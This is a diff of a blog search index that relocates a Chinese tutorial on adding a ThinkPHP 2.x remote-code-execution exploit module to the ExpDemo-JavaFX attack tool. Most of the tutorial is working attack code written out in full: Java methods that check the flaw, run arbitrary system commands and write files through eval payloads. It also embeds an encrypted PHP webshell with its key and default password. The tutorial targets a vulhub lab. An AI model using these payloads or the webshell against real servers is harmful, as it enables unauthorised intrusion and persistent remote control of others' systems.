@@ -1,6 +1,86 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ExpDemo-JavaFX工具新增漏洞编写教程</title>
+    <url>/2021/08/19/ExpDemo-JavaFX%E5%B7%A5%E5%85%B7%E6%96%B0%E5%A2%9E%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<blockquote>
+<p>  为了提高大佬们提交PR的积极性，我也是拼了（<del>这样我就可以名正言顺的偷懒了</del>）</p>
+</blockquote>
+<h2 id="0x01-选漏洞，新建文件"><a href="#0x01-选漏洞，新建文件" class="headerlink" title="0x01 选漏洞，新建文件"></a>0x01 选漏洞，新建文件</h2><p>比如 ThinkPHP2.x的任意代码执行，使用vulhub搭建漏洞</p>
+<p><a href="https://vulhub.org/#/environments/thinkphp/2-rce/">https://vulhub.org/#/environments/thinkphp/2-rce/</a></p>
+<p>docker-compose up -d 一键搭建</p>
+<p>现在还没有ThinkPHP 相关的利用架子，界面显示也没有，只是有个按钮(我特意挑的，从图到exp编写一块教)</p>
+<h3 id="1-1-先把界面立起来"><a href="#1-1-先把界面立起来" class="headerlink" title="1.1 先把界面立起来"></a>1.1 先把界面立起来</h3><p>在<strong>src&#x2F;main&#x2F;resources</strong>下可以看到存在这么多<strong>fxml</strong>文件，直接复制一个<strong>Struts2.fxml</strong>,命名为<strong>ThinkPHP.fxml</strong> 简答方便（若有大佬对界面不满意，请自个调，我不管了）<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011617.png" alt="image-20210818201601174"></p>
+<p>然后将<strong>Struts2Controller</strong>改为<strong>ThinkPHPController</strong>, 再将85行的test.jsp 改为 test.php<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011626.png" alt="image-20210818201939529"></p>
+<p>会发现爆红，这是因为还没有<strong>ThinkPHP</strong>的逻辑控制。到这里再复制一份<strong>Struts2Controller.java</strong>改为<strong>ThinkPHPController.java</strong>即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011632.png" alt="image-20210818202113039"></p>
+<p>还有一个，你要在界面有个按钮去控制显示，在<strong>src&#x2F;main&#x2F;resources&#x2F;fxml&#x2F;Main.fxml</strong>的43行，现在已经有个<strong>ThinkPHP</strong>的按钮了，如果没有，复制一行&lt;JFXButton …&gt; ，然后将<strong>accessibleText</strong>改为你新建的**.fxml<strong>一模一样的名字，再将</strong>text**改成你想显示的名称<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011643.png" alt="image-20210818202513653"></p>
+<p>好了，现在界面好了，运行<strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;AppStartUp.java</strong>看下吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011649.png" alt="image-20210818202826787"></p>
+<p>新建一个界面简单吧</p>
+<h3 id="1-2-新建exp文件"><a href="#1-2-新建exp文件" class="headerlink" title="1.2 新建exp文件"></a>1.2 新建exp文件</h3><p>现在exp包下，还没有新建php相关的漏洞（建包主要是为了方便管理，同类型的，放一个包下）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011658.png" alt="image-20210818200412029"></p>
+<p>右键新建java文件，<strong>php.thinkphp.ThinkPHP2x</strong> ,这表示在<strong>php</strong>包下的<strong>thinkphp</strong>包下新建<strong>ThinkPHP2x.java</strong>文件，没有包则创建包（你就说细不细吧）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011704.png" alt="image-20210818200550535"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011711.png" alt="image-20210818200831938"></p>
+<p>一个EXP文件首先要实现<strong>ExploitInterface</strong>接口，看见爆红不要慌</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011717.png" alt="image-20210818200904924"></p>
+<p>鼠标悬浮上去，点击实现全部方法（我就当大佬们都不会java。怎么可能呢？！）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011728.png" alt="image-20210818200947514"></p>
+<p>框架好了，现在填EXP，具体方法作用一看就懂了,在类中再声明两个属性，一个targe、一个isVul</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011734.png" alt="image-20210818212249668"></p>
+<h3 id="1-3-代码和界面联动"><a href="#1-3-代码和界面联动" class="headerlink" title="1.3 代码和界面联动"></a>1.3 代码和界面联动</h3><p>接下来关注刚新建的<strong>ThinkPHPController.java</strong>文件，修改49行的 <strong>BASICINFO</strong> 和 <strong>STRUTS2</strong> 属性为<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011742.png" alt="image-20210818214305224"></p>
+<p>使用Ctrl + r 健,将 STRUTS2 全部替换为 ThinkPHP </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011749.png" alt="image-20210818214503421">   再添加一个属性，默认上传的shell</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SHELL</span> <span class="operator">=</span> <span class="string">&quot;&lt;?php\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;@error_reporting(0);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;session_start();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $key=\&quot;e45e329feb5d925b\&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$_SESSION[&#x27;k&#x27;]=$key;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tsession_write_close();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$post=file_get_contents(\&quot;php://input\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tif(!extension_loaded(&#x27;openssl&#x27;))\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$t=\&quot;base64_\&quot;.\&quot;decode\&quot;;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=$t($post.\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\tfor($i=0;$i&lt;strlen($post);$i++) &#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\telse\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=openssl_decrypt($post, \&quot;AES128\&quot;, $key);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $arr=explode(&#x27;|&#x27;,$post);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $func=$arr[0];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $params=$arr[1];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tclass C&#123;public function __invoke($p) &#123;eval($p.\&quot;\&quot;);&#125;&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    @call_user_func(new C(),$params);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;?&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>238行也修改 test.jsp 改为 test.php</p>
+<p>修改<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011758.png" alt="image-20210819011243601"></p>
+<p>这个文件修改完毕，不用动了，以后再添加thinkphp相关漏洞，只需要改<strong>BASICINFO</strong>中的描述信息(不加也可,翻遍看)，<strong>ThinkPHP</strong> 还是要改的，这个是选择漏洞列表中的东西，往后添加就行。</p>
+<p>下面去 <strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;tools&#x2F;Tools.java</strong>文件， 找到184行的<strong>getExploit</strong>方法。</p>
+<p>添加一个判断就行，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011804.png" alt="image-20210818215324824"></p>
+<p>这就完了，看着图多，其实就几步，主要是为了详细</p>
+<h2 id="0x02-写EXP的具体实现"><a href="#0x02-写EXP的具体实现" class="headerlink" title="0x02 写EXP的具体实现"></a>0x02 写EXP的具体实现</h2><h3 id="2-1-checkVul-首先检测漏洞是否存在"><a href="#2-1-checkVul-首先检测漏洞是否存在" class="headerlink" title="2.1 checkVul - 首先检测漏洞是否存在"></a>2.1 checkVul - 首先检测漏洞是否存在</h3><p>Vulhub 也给了payload，方便省事，使用poc打一下,原poc是输出phpinfo,这里改成了输出一串字符<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011812.png" alt="image-20210818213036338"></p>
+<p>转成java,都是最基础的写法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测漏洞是否存在</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkVul</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = url;</span><br><span class="line">        <span class="comment">// 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">check_payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(md5(123))&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 src/main/java/fun/fireline/tools/HttpTool.java 工具包中的 get 方法提交</span></span><br><span class="line">            <span class="comment">// 注意 这要用 try  catch 捕获一下异常</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + check_payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            <span class="comment">// 看回显，是否存在 202cb962ac59075b964b07152d234b70</span></span><br><span class="line">            System.out.println(result);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> result.contains(<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isVul = <span class="literal">true</span>;  <span class="comment">// 存在漏洞</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 输出错误日志</span></span><br><span class="line">            logger.error(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>写完测试一下</p>
+<p>运行<strong>AppStartUp.java</strong>，测试一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011828.png" alt="image-20210818224529463"></p>
+<p>成功，而且可以设置代理，走bp，看具体流量</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011837.png" alt="image-20210818224612182"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011844.png" alt="image-20210818224629863"></p>
+<h3 id="2-2-getWebPath-获取网站根目录"><a href="#2-2-getWebPath-获取网站根目录" class="headerlink" title="2.2 getWebPath 获取网站根目录"></a>2.2 getWebPath 获取网站根目录</h3><p>这个写不写都行，这里写一下吧,thinkphp 可以通过<code>realpath(__ROOT__)</code>来获取网站的根路径，改下payload就好</p>
+<p><code>/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的web路径，有最好，没有也无所谓</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getWebPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 这个payload会把 html网页也给输出，这里分割简单去除一下</span></span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;命令执行失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011857.png" alt="image-20210818230017745"></p>
+<h3 id="2-3-exeCmd-执行命令"><a href="#2-3-exeCmd-执行命令" class="headerlink" title="2.3 exeCmd  执行命令"></a>2.3 exeCmd  执行命令</h3><p>这里先将 <strong>isVul</strong>方法改一下，命令执行依赖于检测，只有检测存在，才能进行命令执行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isVul</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isVul;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Payload <code>/index.php?s=/index/index/name/$&#123;@print(system(whoami))&#125;</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令执行</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">exeCmd</span><span class="params">(String cmd, String encoding)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(system(payload))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 替换payload 中的 payload 字符为要执行的命令</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot;payload&quot;</span>, cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试通过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011905.png" alt="image-20210818230642660"></p>
+<h3 id="2-4-uploadFile-上传shell"><a href="#2-4-uploadFile-上传shell" class="headerlink" title="2.4 uploadFile 上传shell"></a>2.4 uploadFile 上传shell</h3><p>Payload <code>http://127.0.0.1:8080/index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;</code> 这是网上的payload，上传后使用蚁剑连接即可</p>
+<p>虽然，直接使用这个payload也可用，但不方便我们自定义上传的shell马</p>
+<p>@bewhale 师傅的 thinkphp利用工具 <a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a> 中使用这个payload来上传文件</p>
+<p><code>/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#39;bak.php&#39;,base64_decode(&#39;PD9waHAgJGE9In4rZCgpIl4iIXsre30iO0AkYj1iYXNlNjRfZGVjb2RlKCR7JGF9WyJhIl0pO2V2YWwoIiIuJGIpOz8%2B&#39;)); </code></p>
+<p>拿来直接用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(String fileContent, String filename, String platform)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 对文件 base64 编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Data</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileContent.getBytes());</span><br><span class="line">        <span class="comment">// 注意一下，需要对 base64 编码后的在进行一次url编码，</span></span><br><span class="line">        base64Data = URLEncoder.encode(base64Data, <span class="string">&quot;UTF-8&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#x27;&quot;</span> + filename + <span class="string">&quot;&#x27;,base64_decode(&#x27;&quot;</span> + base64Data + <span class="string">&quot;&#x27;));&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> HttpTool.getStatus(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line">        System.out.println(status);</span><br><span class="line">        <span class="keyword">if</span>(status == <span class="number">200</span>) &#123;</span><br><span class="line">            result = <span class="string">&quot;上传成功! 路径： &quot;</span> + <span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result =  <span class="string">&quot;上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011913.png" alt="image-20210819011430581"></p>
+<p>打完收工</p>
+]]></content>
+      <categories>
+        <category>GitHub工具</category>
+      </categories>
+      <tags>
+        <tag>GitHub工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GRPC 学习笔记</title>
     <url>/2022/08/11/GRPC%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>gRPC 是 Google 开源的一个远程过程调用(Remote Procedure Call) 框架，在 gRPC 中，客户端应用程序可以直接调用不同机器上的服务器应用程序上的方法，就像它是本地对象一样，更容易创建分布式应用程序和服务。默认情况下，gRPC 使用 <code>协议缓冲区 </code> 通信, 并支持以下语言:</p>
@@ -142,86 +222,6 @@
       </categories>
       <tags>
         <tag>开发</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ExpDemo-JavaFX工具新增漏洞编写教程</title>
-    <url>/2021/08/19/ExpDemo-JavaFX%E5%B7%A5%E5%85%B7%E6%96%B0%E5%A2%9E%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<blockquote>
-<p>  为了提高大佬们提交PR的积极性，我也是拼了（<del>这样我就可以名正言顺的偷懒了</del>）</p>
-</blockquote>
-<h2 id="0x01-选漏洞，新建文件"><a href="#0x01-选漏洞，新建文件" class="headerlink" title="0x01 选漏洞，新建文件"></a>0x01 选漏洞，新建文件</h2><p>比如 ThinkPHP2.x的任意代码执行，使用vulhub搭建漏洞</p>
-<p><a href="https://vulhub.org/#/environments/thinkphp/2-rce/">https://vulhub.org/#/environments/thinkphp/2-rce/</a></p>
-<p>docker-compose up -d 一键搭建</p>
-<p>现在还没有ThinkPHP 相关的利用架子，界面显示也没有，只是有个按钮(我特意挑的，从图到exp编写一块教)</p>
-<h3 id="1-1-先把界面立起来"><a href="#1-1-先把界面立起来" class="headerlink" title="1.1 先把界面立起来"></a>1.1 先把界面立起来</h3><p>在<strong>src&#x2F;main&#x2F;resources</strong>下可以看到存在这么多<strong>fxml</strong>文件，直接复制一个<strong>Struts2.fxml</strong>,命名为<strong>ThinkPHP.fxml</strong> 简答方便（若有大佬对界面不满意，请自个调，我不管了）<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011617.png" alt="image-20210818201601174"></p>
-<p>然后将<strong>Struts2Controller</strong>改为<strong>ThinkPHPController</strong>, 再将85行的test.jsp 改为 test.php<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011626.png" alt="image-20210818201939529"></p>
-<p>会发现爆红，这是因为还没有<strong>ThinkPHP</strong>的逻辑控制。到这里再复制一份<strong>Struts2Controller.java</strong>改为<strong>ThinkPHPController.java</strong>即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011632.png" alt="image-20210818202113039"></p>
-<p>还有一个，你要在界面有个按钮去控制显示，在<strong>src&#x2F;main&#x2F;resources&#x2F;fxml&#x2F;Main.fxml</strong>的43行，现在已经有个<strong>ThinkPHP</strong>的按钮了，如果没有，复制一行&lt;JFXButton …&gt; ，然后将<strong>accessibleText</strong>改为你新建的**.fxml<strong>一模一样的名字，再将</strong>text**改成你想显示的名称<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011643.png" alt="image-20210818202513653"></p>
-<p>好了，现在界面好了，运行<strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;AppStartUp.java</strong>看下吧</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011649.png" alt="image-20210818202826787"></p>
-<p>新建一个界面简单吧</p>
-<h3 id="1-2-新建exp文件"><a href="#1-2-新建exp文件" class="headerlink" title="1.2 新建exp文件"></a>1.2 新建exp文件</h3><p>现在exp包下，还没有新建php相关的漏洞（建包主要是为了方便管理，同类型的，放一个包下）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011658.png" alt="image-20210818200412029"></p>
-<p>右键新建java文件，<strong>php.thinkphp.ThinkPHP2x</strong> ,这表示在<strong>php</strong>包下的<strong>thinkphp</strong>包下新建<strong>ThinkPHP2x.java</strong>文件，没有包则创建包（你就说细不细吧）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011704.png" alt="image-20210818200550535"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011711.png" alt="image-20210818200831938"></p>
-<p>一个EXP文件首先要实现<strong>ExploitInterface</strong>接口，看见爆红不要慌</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011717.png" alt="image-20210818200904924"></p>
-<p>鼠标悬浮上去，点击实现全部方法（我就当大佬们都不会java。怎么可能呢？！）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011728.png" alt="image-20210818200947514"></p>
-<p>框架好了，现在填EXP，具体方法作用一看就懂了,在类中再声明两个属性，一个targe、一个isVul</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011734.png" alt="image-20210818212249668"></p>
-<h3 id="1-3-代码和界面联动"><a href="#1-3-代码和界面联动" class="headerlink" title="1.3 代码和界面联动"></a>1.3 代码和界面联动</h3><p>接下来关注刚新建的<strong>ThinkPHPController.java</strong>文件，修改49行的 <strong>BASICINFO</strong> 和 <strong>STRUTS2</strong> 属性为<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011742.png" alt="image-20210818214305224"></p>
-<p>使用Ctrl + r 健,将 STRUTS2 全部替换为 ThinkPHP </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011749.png" alt="image-20210818214503421">   再添加一个属性，默认上传的shell</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SHELL</span> <span class="operator">=</span> <span class="string">&quot;&lt;?php\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;@error_reporting(0);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;session_start();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $key=\&quot;e45e329feb5d925b\&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$_SESSION[&#x27;k&#x27;]=$key;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tsession_write_close();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$post=file_get_contents(\&quot;php://input\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tif(!extension_loaded(&#x27;openssl&#x27;))\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$t=\&quot;base64_\&quot;.\&quot;decode\&quot;;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=$t($post.\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\tfor($i=0;$i&lt;strlen($post);$i++) &#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\telse\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=openssl_decrypt($post, \&quot;AES128\&quot;, $key);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $arr=explode(&#x27;|&#x27;,$post);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $func=$arr[0];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $params=$arr[1];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tclass C&#123;public function __invoke($p) &#123;eval($p.\&quot;\&quot;);&#125;&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    @call_user_func(new C(),$params);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;?&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>238行也修改 test.jsp 改为 test.php</p>
-<p>修改<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011758.png" alt="image-20210819011243601"></p>
-<p>这个文件修改完毕，不用动了，以后再添加thinkphp相关漏洞，只需要改<strong>BASICINFO</strong>中的描述信息(不加也可,翻遍看)，<strong>ThinkPHP</strong> 还是要改的，这个是选择漏洞列表中的东西，往后添加就行。</p>
-<p>下面去 <strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;tools&#x2F;Tools.java</strong>文件， 找到184行的<strong>getExploit</strong>方法。</p>
-<p>添加一个判断就行，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011804.png" alt="image-20210818215324824"></p>
-<p>这就完了，看着图多，其实就几步，主要是为了详细</p>
